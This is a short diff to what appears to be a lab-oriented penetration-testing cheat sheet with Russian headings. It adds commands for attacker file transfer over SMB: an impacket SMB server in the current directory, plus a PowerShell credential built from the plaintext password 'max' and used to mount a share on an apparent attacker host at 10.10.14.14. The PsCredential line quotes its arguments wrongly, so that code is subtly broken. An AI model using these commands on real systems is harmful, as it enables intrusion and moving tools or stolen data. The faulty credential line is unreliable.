@@ -76,9 +76,18 @@ powershell -encodedcommand ACkACgA=
     
 # Доступ к ресурсу SMB
 
+impacket-smbserver share .
+
+
 Get-Content //10.10.14.4/file
 
 net use z: //10.10.10.14/shares 
+-----
+$pass = "max" | ConvertTo-SecureString -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PsCredential('max, $pass')
+
+New-PSDrive -name max -root \\10.10.14.14\share -Credential $cred -PSProvider "filesystem"
 
 # PowerShellMafia
 
